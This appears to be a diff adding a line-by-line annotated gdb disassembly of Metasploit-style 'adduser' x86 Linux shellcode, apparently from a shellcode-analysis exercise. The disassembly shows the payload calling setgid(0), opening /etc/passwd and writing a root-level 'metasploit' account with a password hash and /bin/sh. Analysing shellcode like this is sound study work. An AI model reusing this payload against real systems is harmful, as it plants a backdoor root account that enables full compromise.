@@ -1,0 +1,51 @@
+ADDUSER > in gdb
+
+
+=> 0xbfffefca: xor ecx,ecx ; clears out ecx making it zero
+0xbfffefcc: mov ebx,ecx ; places the value 0 into ebx (just to clear out ebx)
+0xbfffefce: push 0x46 ; pushes 70(setgid syscall) onto the stack
+0xbfffefd0: pop eax ; places 70 into the EAX register
+0xbfffefd1: int 0x80 ; executes, runs with group id of the file
+0xbfffefd3: push 0x5 ; pushes the value 5 (syscall open) onto the stack
+0xbfffefd5: pop eax ; places it into the EAX
+0xbfffefd6: xor ecx,ecx ; clears out the ecx register making it zero
+0xbfffefd8: push ecx ; pushes the value zero onto the stack
+0xbfffefd9: push 0x64777373 ; the string “/etc//passwd” gets pushed onto the stack
+0xbfffefde: push 0x61702f2f
+0xbfffefe3: push 0x6374652f
+0xbfffefe8: mov ebx,esp ; now EBX should point to the string “/etc//passwd”
+0xbfffefea: inc ecx ; increments the value of ecx by 1 which should now equal 1
+0xbfffefeb: mov ch,0x4 ; moves 4 into ch now making ecx equal to 401
+0xbfffefed: int 0x80 ; now executes open
+0xbfffefef: xchg ebx,eax ; now places the file descriptor which is stores in eax into ebx
+0xbfffeff0: call 0xbffff01d ; performs call-pop to save a string for later into ECX
+0xbfffeff5: ins DWORD PTR es:[edi],dx ;the following bytes represent “metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\nY\213Q\374j\004X̀j\001X̀”
+0xbfffeff6: gs
+0xbfffeff7: je 0xbffff05a
+0xbfffeff9: jae 0xbffff06b
+0xbfffeffb: ins BYTE PTR es:[edi],dx
+0xbfffeffc: outs dx,DWORD PTR ds:[esi]
+0xbfffeffd: imul esi,DWORD PTR [edx+edi*1+0x41],0x49642f7a
+0xbffff005: jae 0xbffff071
+0xbffff007: xor al,0x70
+0xbffff009: xor al,0x49
+0xbffff00b: push edx
+0xbffff00c: arpl WORD PTR [edx],di
+0xbffff00e: xor BYTE PTR [edx],bh
+0xbffff010: xor BYTE PTR [edx],bh
+0xbffff012: cmp ch,BYTE PTR [edi]
+0xbffff014: cmp ch,BYTE PTR [edi]
+0xbffff016: bound ebp,QWORD PTR [ecx+0x6e]
+0xbffff019: das
+0xbffff01a: jae 0xbffff084
+0xbffff01c: or bl,BYTE PTR [ecx-0x75]
+0xbffff01f: push ecx
+0xbffff020: cld
+0xbffff021: pop ecx ; contains the address to the previous string
+0xbffff022: mov edx,DWORD PTR [ecx-0x4] ; contains the length of the previous string
+0xbffff025: push 0x4 ; pushes the write syscall onto the stack
+0xbffff027: pop eax ; places the write syscall (4) into the EAX
+0xbffff028: int 0x80 ; executes write
+0xbffff02a: push 0x1 ; pushes the exit syscall onto the stack
+0xbffff02c: pop eax ; pops the exit syscall from the stack to the EAX register
+0xbffff02d: int 0x80 ; executes to exit gracefully
